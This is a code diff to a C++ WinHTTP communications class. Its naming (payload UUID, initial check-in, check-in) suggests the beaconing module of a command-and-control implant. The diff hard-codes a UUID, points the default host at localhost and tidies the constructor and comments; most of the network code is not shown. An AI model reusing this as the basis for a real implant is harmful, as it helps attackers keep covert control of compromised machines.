@@ -1,3 +1,4 @@
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 #include "CommManager.h"
 #include "base64.hpp"
 #include <iostream>
@@ -8,21 +9,23 @@
 #pragma comment(lib, "winhttp.lib")
 
 #ifndef PAYLOAD_UUID
-	#define PAYLOAD_UUID "default"
+	#define PAYLOAD_UUID "d0e055ee-4290-4bbd-abff-71fbdfcc4058"
 #endif
 
 #ifndef HOST
-	#define HOST "127.0.0.1"
+	#define HOST "localhost"
 #endif
 
-
-CommManager::CommManager(const std::string& empUUID, const std::string& empHost)
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+// Default constructor 
+CommManager::CommManager()
 {
-	uuid = empUUID.empty() ? PAYLOAD_UUID : empUUID;
-	host = empHost.empty() ? HOST : empHost;
+	payloaddUUID = PAYLOAD_UUID;
+	host = HOST;
 }
 
-
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+// Intial checkin 
 void CommManager::IntialCheckin(const std::string& json)
 {
 	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
@@ -50,7 +53,7 @@ void CommManager::IntialCheckin(const std::string& json)
 	}
 
 	LPCWSTR pwszHeaders = L"Content-Type: application/json\r\n";
-	std::string strData = base64::to_base64(uuid + json);
+	std::string strData = base64::to_base64(payloaddUUID + json);
 	LPVOID lpOptional = (LPVOID)strData.c_str();
 	DWORD dwOptionalLength = (DWORD)strData.length();
 
@@ -109,6 +112,8 @@ void CommManager::IntialCheckin(const std::string& json)
 	if (hSession) WinHttpCloseHandle(hSession);
 }
 
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+// Full-established checkin 
 std::string CommManager::Checkin(const std::string& json)
 {
 	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
@@ -210,3 +215,4 @@ std::string CommManager::Checkin(const std::string& json)
 
 	return result;
 }
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
